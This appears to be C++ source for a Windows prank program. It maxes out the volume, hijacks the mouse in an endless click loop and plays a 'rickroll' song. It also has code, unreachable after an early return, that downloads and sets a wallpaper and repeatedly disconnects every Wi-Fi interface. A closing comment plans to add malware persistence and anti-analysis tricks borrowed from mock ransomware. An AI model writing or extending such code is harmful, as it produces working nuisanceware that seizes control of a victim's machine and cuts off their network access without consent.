#include "pch.h"
#include <windows.h> // Provides WinAPI access
#include <objbase.h> // Network objects
#include <wtypes.h> // Wide character types for Windows access
#include <wlanapi.h> // Network API
#include <stdlib.h> // C standard library
#include <WinUser.h> // Req header for keyboard input
#include <WinInet.h> // Req header for wallpaper-set function
#include <ShlObj.h> // Reg header for wallpaper-set objects
#include <cmath> // For exponential character output
#include <time.h> // For initial random seeding 
#include <corecrt_wstring.h>
#include <curl/curl.h> // For downloading files from internet sources
#include <stdio.h> // Debug printouts
#include <direct.h>
#include <endpointvolume.h> // Dont think we need this anymore
#include <mmdeviceapi.h> // For playing audio through the microsoft's media service
#include <string>
#include <iostream>
#define GetCurrentDir _getcwd
#ifndef UNICODE // Req definition for Windows.h
#define UNICODE
#endif
#pragma comment(lib, "wlanapi.lib") // Lib for networking
#pragma comment(lib, "ole32.lib") // Lib for networking 
#pragma comment(lib, "Winmm.lib") // Lib for mp3 playing


struct AudioRet {
	bool isPlaying = true;
	LPSTR timeToEnd;
};

void MoveCursor() {
	INPUT Input = { 0 };
	Input.type = INPUT_MOUSE;

	Input.mi.dx = (LONG)0;
	Input.mi.dy = (LONG)0;

	// set move cursor directly and left click
	Input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;

	SendInput(1, &Input, sizeof(INPUT));
}

void MaxVol()
{
	INPUT ip = { 0 };
	ip.type = INPUT_KEYBOARD;
	ip.ki.wVk = VK_VOLUME_UP;   //or VOLUME_DOWN or MUTE
	for (int i = 0; i <= 50; i++) {
		SendInput(1, &ip, sizeof(INPUT));
		ip.ki.dwFlags = KEYEVENTF_KEYUP;
		SendInput(1, &ip, sizeof(INPUT));
		ip.ki.dwFlags = 0;
	}
}


DWORD WINAPI PlaySong(LPVOID lpParameter) {

	char cCurrentPath[FILENAME_MAX];
	AudioRet* RetStruct = reinterpret_cast<AudioRet*>(lpParameter);

	if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath)))
	{
		return 1;
	}

	cCurrentPath[sizeof(cCurrentPath) - 1] = '\0'; /* not really required */

	char outfilename[FILENAME_MAX] = "\\audio.mp3";

	std::string main("open \"");//, "\" type mpegvideo alias mp3");
	errno_t success = strcat_s(cCurrentPath, sizeof(cCurrentPath), outfilename);
	main.append(cCurrentPath);
	main.append("\" type mpegvideo alias mp3");

	printf("Sent off command to mci: %s\n", main.c_str());


	mciSendString(main.c_str(), NULL, 0, NULL);
	
	char buff[100];
	mciSendString("status mp3 length", buff, sizeof(buff), NULL);
	RetStruct->timeToEnd = buff;
	
	mciSendString("play mp3 wait", NULL, 0, NULL);
	RetStruct->isPlaying = false;
	
	return 0;
}

void SetWallpaper(LPCWSTR file) {
	CoInitializeEx(0, COINIT_APARTMENTTHREADED);
	IActiveDesktop* desktop;
	HRESULT status = CoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER, IID_IActiveDesktop, (void**)&desktop);
	WALLPAPEROPT wOption;
	ZeroMemory(&wOption, sizeof(WALLPAPEROPT));


	wOption.dwSize = sizeof(WALLPAPEROPT);
	wOption.dwStyle = WPSTYLE_CENTER;

	status = desktop->SetWallpaper(file, 0);
	wprintf(L"SetWallpaper status: %ld\n", status);

	status = desktop->SetWallpaperOptions(&wOption, 0);
	wprintf(L"SetWallpaperOptions status: %ld\n", status);

	status = desktop->ApplyChanges(AD_APPLY_ALL);
	wprintf(L"Applied changes status: %ld\n", status);

	desktop->Release();
	CoUninitialize();
}

int KillWifi() {
	// Declare and initialize variables.

	HANDLE hClient = NULL;
	DWORD dwMaxClient = 2;
	DWORD dwCurVersion = 0;
	DWORD dwResult = 0;

	WCHAR GuidString[40] = { 0 };

	dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient); //  
	if (dwResult != ERROR_SUCCESS) {
		// FormatMessage can be used to find out why the function failed
		return 1;
	}

	/* variables used for WlanEnumInterfaces  */

	PWLAN_INTERFACE_INFO_LIST pIfList = NULL; // interface listing catch buffer
	PWLAN_INTERFACE_INFO pIfInfo = NULL; // interface information catch buffer

	dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
	if (dwResult != ERROR_SUCCESS) {
		// FormatMessage can be used to find out why the function failed
		return 1;
	}
	else {
		for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
			pIfInfo = (WLAN_INTERFACE_INFO *)&pIfList->InterfaceInfo[i];
			if (pIfInfo->isState == wlan_interface_state_connected) {
				DWORD close = WlanDisconnect(hClient, &pIfInfo->InterfaceGuid, NULL);
				/*if (close != ERROR_SUCCESS) {
					std::cout << "Failed to disconnect interface" << std::endl;
				}
				else {
					std::cout << "Successfully disconnected from network" << std::endl;
				}*/
			}
			else {
				//std::cout << "Interface not connected" << std::endl;
				break;
			}
		}
	}

	if (pIfList != NULL) { // tests if Interface list contains anything (anything was use during the bulk of function execution)
		WlanFreeMemory(pIfList); // if it was used: free the memory and set it to NULL, for future use
		pIfList = NULL;
	}
	return 0; // ends function
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
	size_t written;
	written = fwrite(ptr, size, nmemb, stream);
	return written;
}

size_t DownloadFile(std::string url, char* outfilename) {
	CURL *curl;
	FILE *fp;
	CURLcode res;
	curl = curl_easy_init();
	if (curl) {
		errno_t suc = fopen_s(&fp, outfilename, "wb");
		//fp = fopen_s(outfilename, "wb");
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		fclose(fp);
		return 0;
	}
	return 1;
}

DWORD WINAPI SongPlayin(LPVOID lpparameter) {
	bool* done = reinterpret_cast<bool*>(lpparameter);
	
	
	AudioRet passoff;
	passoff.isPlaying = true;
	passoff.timeToEnd = "0";
	//while (true) {
	for(int i = 0; i < 10; i++){
		HANDLE threadHandler = CreateThread(0, 0, PlaySong, reinterpret_cast<void*>(&passoff), 0, 0); // starts rickroll thread to get out of way for other routines to execute
		
		Sleep(1000); // gives thread time to complete initial thing
		printf("Length of track: %s\n", passoff.timeToEnd);
		printf("SongPlaying value: %d\n", passoff.isPlaying);

		std::string number(passoff.timeToEnd);
		int time = std::stoi(number);

		printf("Time in integer: %d\n", time);
		Sleep(time);
		printf("TimerUP\n");
		CloseHandle(threadHandler);
	}
	printf("Song complete. Exiting");
	return 0;

}

DWORD WINAPI troll_the_mouse(LPVOID args) {
	while (true)
	{
		MoveCursor();
	}
}

//int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) // make sure to change this back after debug
int main()
{
	MaxVol();
	
	HANDLE mouseThread = CreateThread(0, 0, troll_the_mouse, NULL, 0, 0);

	bool done = false;
	HANDLE audioThread = CreateThread(0, 0, SongPlayin, reinterpret_cast<void*>(&done), 0, 0); // Plays song (rickroll as of right now)
	while (!done) {
		Sleep(1000);
	}
	CloseHandle(audioThread);
	CloseHandle(mouseThread);
	return 0; // debug output


	int count = 0;
	std::string url = "https://i.ytimg.com/vi/ibr6egCSqiE/maxresdefault.jpg";

	char cCurrentPath[FILENAME_MAX];

	if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath)))
	{
		return 1;
	}

	cCurrentPath[sizeof(cCurrentPath) - 1] = '\0'; /* not really required */

	char outfilename[FILENAME_MAX] = "file.jpg";
	char file[FILENAME_MAX] = "\\file.jpg";

	errno_t succ = strcat_s(cCurrentPath, MAX_PATH, file);
	DownloadFile(url, outfilename);
	//LPCWSTR fin = cC;
	SetWallpaper((LPCWSTR) cCurrentPath);

	
	while (count < 1000) { // # of reps
		int v1 = 1;
		if (v1) {
			MoveCursor();
		}
		KillWifi();
		count++;
		Sleep(2000); // Wait time
	}
	
	//CloseHandle(threadHandler);

	return 0;
}

/*
	Ideas to add:
		1. Add continually popping up Soviet Popup (https://stackoverflow.com/questions/1186017/how-do-i-build-a-graphical-user-interface-in-c)
			(http://www.cplusplus.com/forum/beginner/137030/)
			(https://stackoverflow.com/questions/2886609/how-to-make-multiple-windows-using-win32-api)
			(http://www.winprog.org/tutorial/start.html)

		2. Project type change note
		https://stackoverflow.com/questions/6626397/error-lnk2019-unresolved-external-symbol-winmain16-referenced-in-function#8532797

		3. Check out persistence and defensive methods from this mock ransomware and this mock malware
			https://github.com/ryancor/mock-ransomware/blob/master/ransomware/ransomware/anti_checks.cpp
			http://www.rohitab.com/discuss/topic/25977-malware-c/

*/